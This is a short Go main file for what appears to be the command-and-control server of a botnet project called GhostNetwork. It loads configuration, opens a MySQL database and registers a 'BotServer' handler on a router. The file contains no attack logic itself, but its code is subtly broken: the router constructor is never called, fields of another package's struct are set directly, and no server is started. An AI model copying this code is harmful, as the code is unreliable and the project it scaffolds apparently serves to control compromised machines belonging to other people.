package main

import (
	"github.com/go-chi/chi"

	"github.com/bienkma/GhostNetwork/cnc_server/configuration"
	"github.com/bienkma/GhostNetwork/cnc_server/database"
	"github.com/bienkma/GhostNetwork/cnc_server/handler"
	MyRouter "github.com/bienkma/GhostNetwork/cnc_server/router"
)

func main() {
	CNCConf := configuration.CNCConf()

	dbconfig := database.MySqlConfig{
		Host:          CNCConf.DBAddress,
		Port:          CNCConf.DBPort,
		DbName:        CNCConf.DBName,
		DBUsername:    CNCConf.DBUsername,
		Password:      CNCConf.DBPassword,
		LogEnable:     CNCConf.DBLogMode,
		MaxConnection: CNCConf.DBMaxConnection,
	}

	db := database.OpenMySQL(dbconfig)
	defer db.Close()

	r := chi.NewRouter
	var botServer = handler.BotServer{
		db:     db,
		config: dbconfig,
	}

	MyRouter.Register(r, botServer)

}
